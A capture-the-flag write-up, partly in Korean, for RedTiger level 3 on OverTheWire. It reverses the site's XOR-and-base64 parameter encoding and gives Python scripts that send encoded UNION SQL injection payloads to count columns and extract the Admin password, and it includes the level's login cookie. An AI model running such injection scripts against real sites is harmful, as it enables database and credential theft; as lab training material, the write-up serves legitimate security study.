================================================================================================================
[redtiger] level3
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="?usr[]=",arrowhead="normal"];
        step3 -> step2[label="@solve",arrowhead="normal"];
    }

|

Source Analysis
================================================================================================================

- GET 페이지 취약점
- GET 파라미터: usr
- 테이블명: level3_users


Show userdetails: 
TheCow
Admin

.. code-block:: html

    Show userdetails: 
    <a href="?usr=MTQ4MTY4MTY1MTMxMTc1MTgz">TheCow</a>
    <a href="?usr=MTI5MTY0MTczMTY5MTc0">Admin</a>

    <form method="post">
        Username: <input type="text" name="user">
        Password: <input type="text" name="password">
        <input type="submit" name="login" value="Login">
    </form>
    

|

Array Injection
================================================================================================================

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "https://redtiger.labs.overthewire.org/level3.php"
    cookies = {
        "level3login":"securitycat_says_meow_and_likes_cheese"
    }

    # []
    payload = {
        "usr[]": ""
    }

    r = requests.post(url, cookies=cookies, params=payload, verify=False)

    print r.content


[error page]

.. code-block:: html

    Warning: preg_match() expects parameter 2 to be string, array given in /var/www/hackit/urlcrypt.inc on line 21

|

.. code-block:: php

    <?php
            
        function encrypt($str)
        {
            $cryptedstr = "";
            for ($i =0; $i < strlen($str); $i++)
            {
                $temp = ord(substr($str,$i,1)) ^ 192;
                
                while(strlen($temp)<3)
                {
                    $temp = "0".$temp;
                }
                $cryptedstr .= $temp. "";
            }
            return base64_encode($cryptedstr);
        }
      
        function decrypt ($str)
        {
            if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
            {
                $str = base64_decode($str);
                if ($str != "" && $str != null && $str != false)
                {
                    $decStr = "";
                    
                    for ($i=0; $i < strlen($str); $i+=3)
                    {
                        $array[$i/3] = substr($str,$i,3);
                    }

                    foreach($array as $s)
                    {
                        $a = $s^192;
                        $decStr .= chr($a);
                    }
                    
                    return $decStr;
                }
                return false;
            }
            return false;
        }
    ?>

|

.. code-block:: python

    import base64

    def encrypt(_str):
        cryptedstr = ""
        for i in range(len(_str)):
            temp = ord(_str[i:i+1]) ^ 192
            temp = str(temp)
            while len(temp)<3:
                temp = "0" + temp
            cryptedstr += temp
        
        return base64.b64encode(cryptedstr)


|

Column Length
================================================================================================================

.. code-block:: python

    import requests
    import base64

    requests.packages.urllib3.disable_warnings()

    def encrypt(_str):
        cryptedstr = ""
        for i in range(len(_str)):
            temp = ord(_str[i:i+1]) ^ 192
            temp = str(temp)
            while len(temp)<3:
                temp = "0" + temp
            cryptedstr += temp
        
        return base64.b64encode(cryptedstr)

    url = "https://redtiger.labs.overthewire.org/level3.php"
    cookies = {
        "level3login":"securitycat_says_meow_and_likes_cheese"
    }

    n = 0
    bef_ret = ''
    for l in range(20):
        params = {
            "usr": encrypt("' union select %s from level3_users-- " % str(n))
        }
        print "' union select %s from level3_users-- " % str(n)
        n = str(n) + "," + str(l+1)
        r = requests.post(url, cookies=cookies, params=params, verify=False)
        if bef_ret!=r.content and bef_ret!='':
            print r.content

        bef_ret = r.content




|

Data Extract
================================================================================================================



.. code-block:: python

    import requests
    import base64

    requests.packages.urllib3.disable_warnings()

    def encrypt(_str):
        cryptedstr = ""
        for i in range(len(_str)):
            temp = ord(_str[i:i+1]) ^ 192
            temp = str(temp)
            while len(temp)<3:
                temp = "0" + temp
            cryptedstr += temp
        
        return base64.b64encode(cryptedstr)

    url = "https://redtiger.labs.overthewire.org/level3.php"
    cookies = {
        "level3login":"securitycat_says_meow_and_likes_cheese"
    }


    params = {
        "usr": encrypt("' union select 1,2,3,username,password,6,7 from level3_users where username='Admin' -- ")
    }

    r = requests.post(url, cookies=cookies, params=params, verify=False)
    print r.content